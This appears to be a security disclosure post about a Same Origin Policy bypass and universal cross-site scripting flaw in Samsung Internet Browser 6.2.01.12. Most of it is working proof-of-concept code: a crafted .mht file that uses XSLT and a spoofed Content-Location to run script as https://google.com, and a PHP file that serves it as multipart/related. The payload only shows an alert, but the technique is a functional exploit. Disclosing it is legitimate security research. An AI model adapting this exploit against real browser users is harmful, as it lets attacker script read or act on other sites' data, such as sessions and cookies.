


Samsung Internet Browser SOP Bypass/UXSS

There is a Same Origin Policy bypass / Universal Cross Site Scripting issue in Samsung Internet Browser (tested on latest version -  6.2.01.12).


http://prooftestdomain.hol.es/test/test.php

I attached a POC image below to show that Samsung Internet Browser says its origin is https://google.com and document.domain returns https://google.com while in reality we are in my test host domain.

Following is Proof Of Concept code, you need to upload .mht and .php file. When you visit .php file the exploit runs successfully and bypasses Same Origin Policy to achieve UXSS.

test.mht file content:

MIME-Version: 1.0
Content-Type: multipart/related;
 type="text/html";
 boundary="----MultipartBoundary--"

------MultipartBoundary--
Content-Type: application/xml;

<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE catalog [
<!ATTLIST xsl:stylesheet
id ID #REQUIRED>
]>
<xsl:stylesheet id="stylesheet" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="*">
<html><iframe style="display:none" src="https://google.com"></iframe></html>
</xsl:template>
</xsl:stylesheet>

------MultipartBoundary--
Content-Type: text/html
Content-Location: https://google.com

<script>alert('lol \n\n' + 'document.domain: \n' + document.domain)</script>
------MultipartBoundary----





test.php file content:

<?php
$filename=realpath("test.mht");
header( "Content-type: multipart/related");
readfile($filename);
?>

